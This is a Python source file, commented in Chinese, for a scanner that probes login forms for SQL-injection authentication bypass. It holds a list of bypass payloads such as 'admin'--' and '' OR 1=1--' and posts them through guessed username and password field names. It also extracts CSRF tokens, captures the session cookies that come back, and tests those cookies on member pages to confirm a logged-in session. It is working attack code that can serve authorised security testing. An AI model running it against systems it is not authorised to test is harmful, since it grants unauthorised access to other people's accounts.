"""Login Form SQL Injection Scanner
检测登录表单的 SQL 注入认证绕过漏洞（无错 SQLi）。
原理：SQL 正确闭合 + 注释密码条件 → 服务器创建 session → 攻击者获得有效 PHPSESSID。
"""
import asyncio
import re
import requests
from dataclasses import dataclass
from typing import List, Optional, Dict


@dataclass
class LoginSqliResult:
    url: str
    field: str
    payload: str
    sqli_type: str
    confidence: float
    evidence: str
    session_cookie: str
    poc: str


class LoginSqliScanner:
    """
    登录表单 SQL 注入检测器。
    使用 requests 库（而非 aiohttp）以确保正确处理 Set-Cookie 响应头。
    """

    # 认证绕过 SQLi payloads
    PAYLOADS = [
        ("admin'--",             "comment-mysql"),
        ("admin'#",               "comment-mysql-hash"),
        ("' OR 1=1--",           "or-comment"),
        ("' OR 1=1#",            "or-comment-hash"),
        ("' OR 'x'='x'--",       "or-comment"),
        ("' OR 'a'='a'--",       "or-comment"),
        ("' OR 1=1 LIMIT 1--",   "or-comment-limit"),
        ("admin' OR '1'='1",     "or-true"),
        ("' OR 1=1",             "or-blank"),
        ("1' OR 1=1",            "or-numeric"),
        ("' UNION SELECT 1--",   "union"),
    ]

    USERNAME_FIELDS = [
        "username", "user_name", "user", "login", "email",
        "email_address", "account", "userid", "user_id", "name"
    ]

    PASSWORD_FIELDS = [
        "password", "pass", "pwd", "user_password", "passwd"
    ]

    SESSION_COOKIE_NAMES = [
        "PHPSESSID", "SessionID", "session_id", "ASP.NET_SessionId",
        "JSESSIONID", "CAKEPHP", "ci_session"
    ]

    LOGIN_FAIL_PATTERNS = [
        r"incorrect",
        r"invalid.*(login|password|credentials)",
        r"wrong.*(password|login)",
        r"failed.*login",
        r"login.*fail",
        r"denied",
        r"access.*denied",
    ]

    def __init__(self, timeout: int = 8, delay: float = 0.2):
        self.timeout = timeout
        self.delay = delay
        self._ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    async def scan(self, login_url: str) -> List[LoginSqliResult]:
        """主扫描入口"""
        results = []
        seen_payloads = set()

        # 获取基准响应（用错误凭据）
        base_len = self._get_baseline_len(login_url)

        for payload, sqli_type in self.PAYLOADS:
            if payload in seen_payloads:
                continue
            seen_payloads.add(payload)

            found = False
            for user_field in self.USERNAME_FIELDS:
                for pass_field in self.PASSWORD_FIELDS:
                    r = await self._test_payload(
                        login_url, user_field, pass_field,
                        payload, sqli_type, base_len
                    )
                    if r:
                        results.append(r)
                        found = True
                        break  # 一个字段命中后停止此 payload
                if found:
                    break  # payload 命中后停止

            await asyncio.sleep(self.delay)

        return results

    def _get_baseline_len(self, login_url: str) -> int:
        """获取基准响应长度（错误凭据）"""
        try:
            resp = requests.post(
                login_url,
                data={"__user__": "__wrong__", "__pass__": "__wrong__"},
                timeout=self.timeout,
                allow_redirects=False,
                headers={"User-Agent": self._ua}
            )
            return len(resp.text)
        except Exception:
            return 0

    def _extract_csrf(self, login_url: str) -> tuple:
        """
        GET login 页面，提取 CSRF token。
        Returns: (token_value, token_field_name)
        """
        try:
            resp = requests.get(login_url, timeout=self.timeout,
                               headers={"User-Agent": self._ua})
            text = resp.text

            token_names = [
                "token", "user_token", "csrf_token", "csrftoken",
                "_token", "authenticity_token", "request_token"
            ]

            for name in token_names:
                # 匹配 value >= 8 字符的 hidden/token input
                m = re.search(
                    r'<input[^>]+name=["\']?' + re.escape(name) + r'["\']?[^>]'
                    r'*(?:type=["\']?hidden["\']?)?[^>]+value=["\']([^\"\']{8,})["\']',
                    text, re.I
                )
                if not m:
                    m = re.search(
                        r'<input[^>]+value=["\']([^\"\']{8,})["\'][^>]'
                        r'*(?:name=["\']?' + re.escape(name) + r'["\']?|type=["\']?hidden["\']?[^>]*name=["\']?' + re.escape(name) + r'["\']?)',
                        text, re.I
                    )
                if m:
                    val = m.group(1)
                    if len(val) >= 8:
                        return val, name
        except Exception:
            pass
        return "", ""

    async def _test_payload(
        self,
        login_url: str,
        user_field: str, pass_field: str,
        payload: str, sqli_type: str,
        base_len: int
    ) -> Optional[LoginSqliResult]:

        # 1. 获取 CSRF token
        token_val, token_name = self._extract_csrf(login_url)

        # 2. 构造 POST 数据
        post_data = {
            user_field: payload,
            pass_field: "WVS_INVALID_PASS_12345",
        }
        if token_val and token_name:
            post_data[token_name] = token_val

        # 3. POST login（用 requests，直接从 Response 拿 Set-Cookie）
        try:
            resp = requests.post(
                login_url,
                data=post_data,
                timeout=self.timeout,
                allow_redirects=False,
                headers={"User-Agent": self._ua}
            )
            resp_text = resp.text
            resp_cookies = dict(resp.cookies)
            resp_status = resp.status_code
        except Exception:
            return None

        # ── 检测信号 ──

        # 信号1: Session Cookie 设置（强信号）
        session_cookie_name, session_cookie_val = self._detect_session_cookie(resp_cookies)
        if session_cookie_name:
            len_diff = abs(len(resp_text) - base_len)
            len_diff_pct = len_diff / max(base_len, 1)

            # 用 session cookie 验证
            validated = self._validate_session(login_url, session_cookie_val)

            if validated:
                confidence = 0.95
                evidence = (f"Session '{session_cookie_name}' set + "
                           f"session validated on member page")
            elif len_diff_pct > 0.05:
                confidence = 0.8
                evidence = (f"Session '{session_cookie_name}' set + "
                           f"response diff {len_diff_pct:.0%}")
            else:
                confidence = 0.6
                evidence = f"Session '{session_cookie_name}' set after injection"

            return LoginSqliResult(
                url=login_url,
                field=user_field,
                payload=payload,
                sqli_type=sqli_type,
                confidence=confidence,
                evidence=evidence,
                session_cookie=session_cookie_name,
                poc=(f"POST {login_url} | "
                     f"{user_field}={payload}&{pass_field}=anything")
            )

        # 信号2: 响应长度显著变化（盲注可能）
        len_diff = abs(len(resp_text) - base_len)
        len_diff_pct = len_diff / max(base_len, 1)
        if len_diff_pct > 0.1:
            return LoginSqliResult(
                url=login_url,
                field=user_field,
                payload=payload,
                sqli_type=sqli_type,
                confidence=0.4,
                evidence=f"Response length changed {len_diff_pct:.0%} but no session cookie",
                session_cookie="",
                poc=(f"POST {login_url} | "
                     f"{user_field}={payload}&{pass_field}=anything")
            )

        return None

    def _detect_session_cookie(self, cookies: Dict[str, str]) -> tuple:
        """从 cookie dict 中检测 session cookie"""
        for name in self.SESSION_COOKIE_NAMES:
            for k, v in cookies.items():
                if k.lower() == name.lower():
                    return k, v
        return "", ""

    def _validate_session(self, login_url: str, session_cookie_val: str) -> bool:
        """用获得的 session cookie 访问会员页，验证是否真正登录成功"""
        from urllib.parse import urljoin

        member_paths = [
            "/index.php?page=profile",
            "/index.php?page=home",
            "/index.php",
            "/profile",
            "/account",
            "/dashboard",
        ]

        for path in member_paths:
            base = login_url.split('?')[0]
            member_url = urljoin(base, path)
            try:
                resp = requests.get(
                    member_url,
                    cookies={"PHPSESSID": session_cookie_val},
                    timeout=self.timeout,
                    headers={"User-Agent": self._ua}
                )
                text = resp.text

                # 未登录特征
                fail_count = sum(
                    bool(re.search(p, text, re.I))
                    for p in self.LOGIN_FAIL_PATTERNS
                )
                has_password_field = (
                    'password' in text[:500] and
                    'login' in text[:500]
                )
                is_login_page = fail_count >= 1 and has_password_field

                if not is_login_page and resp.status_code < 400:
                    return True
            except Exception:
                continue

        return False
